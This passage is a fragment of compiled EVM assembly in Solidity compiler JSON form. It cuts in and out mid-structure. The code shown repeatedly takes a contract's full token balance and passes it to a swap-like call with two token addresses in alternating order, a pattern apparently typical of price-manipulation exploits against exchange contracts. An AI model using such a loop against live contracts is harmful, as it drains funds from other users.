											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "125"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 871,
											"end": 942,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "tag",
											"source": 4,
											"value": "125"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "126"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "tag",
											"source": 4,
											"value": "126"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "128"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 871,
											"end": 942,
											"name": "tag",
											"source": 4,
											"value": "128"
										},
										{
											"begin": 871,
											"end": 942,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 959,
											"end": 962,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 959,
											"end": 962,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 959,
											"end": 962,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 969,
											"end": 975,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 959,
											"end": 962,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 977,
											"end": 983,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1018,
											"end": 1022,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 959,
											"end": 962,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 959,
											"end": 962,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 959,
											"end": 962,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 959,
											"end": 962,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 954,
											"end": 968,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 954,
											"end": 968,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 969,
											"end": 975,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 969,
											"end": 975,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 969,
											"end": 975,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 969,
											"end": 975,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 977,
											"end": 983,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 977,
											"end": 983,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 969,
											"end": 975,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 969,
											"end": 975,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1009,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 985,
											"end": 1009,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "131"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "tag",
											"source": 4,
											"value": "131"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "132"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 985,
											"end": 1024,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "tag",
											"source": 4,
											"value": "132"
										},
										{
											"begin": 985,
											"end": 1024,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "133"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 954,
											"end": 1025,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "tag",
											"source": 4,
											"value": "133"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "134"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "tag",
											"source": 4,
											"value": "134"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "136"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "tag",
											"source": 4,
											"value": "136"
										},
										{
											"begin": 954,
											"end": 1025,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1040,
											"end": 1043,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1040,
											"end": 1043,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1040,
											"end": 1043,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1050,
											"end": 1056,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1040,
											"end": 1043,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1058,
											"end": 1064,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1099,
											"end": 1103,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1040,
											"end": 1043,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1040,
											"end": 1043,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1040,
											"end": 1043,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1040,
											"end": 1043,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1035,
											"end": 1049,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1035,
											"end": 1049,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1050,
											"end": 1056,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1050,
											"end": 1056,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1050,
											"end": 1056,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1050,
											"end": 1056,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1058,
											"end": 1064,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1058,
											"end": 1064,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1050,
											"end": 1056,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1050,
											"end": 1056,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1090,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 1066,
											"end": 1090,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "139"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "tag",
											"source": 4,
											"value": "139"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "140"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1066,
											"end": 1105,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "tag",
											"source": 4,
											"value": "140"
										},
										{
											"begin": 1066,
											"end": 1105,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "141"
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1035,
											"end": 1106,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1035,
											"end": 1106,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1035,
